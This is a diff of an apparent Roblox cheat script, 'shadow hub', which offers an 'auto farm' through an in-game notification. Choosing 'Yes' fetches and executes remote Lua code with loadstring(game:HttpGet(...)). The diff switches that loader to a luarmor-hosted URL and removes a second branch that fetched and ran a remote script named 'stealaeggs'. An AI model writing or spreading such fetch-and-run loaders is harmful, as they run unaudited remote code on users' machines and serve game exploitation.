@@ -5,11 +5,11 @@ local bindable = Instance.new("BindableFunction")
 
 function bindable.OnInvoke(selectedButton)
     if selectedButton == "Yes" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/mirandaafk.lua"))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/36107afd3107e8d841f9d1a69e2465d4.lua"))()
         -- Đặt code xử lý khi chọn Yes ở đây
-    elseif selectedButton == "No" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/stealaeggs"))()
-        -- Đặt code xử lý khi chọn No ở đây
+    elseif selectedButton == "Err" then
+        
+        -- Đặt code xử lý khi chọn Err ở đây
     end
 end
 
@@ -17,9 +17,9 @@ end
 StarterGui:SetCore("SendNotification", {
     Title = "shadow hub",
     Text = "auto farm script is ready, do you want to start?",
-    Icon = "rbxassetid://6033363025",
+    Icon = "rbxassetid://91892876206842",
     Duration = 10,
     Button1 = "Yes",
-    Button2 = "No",
+    Button2 = "Err",
     Callback = bindable -- Gắn callback để nhận phản hồi từ nút bấm
 })
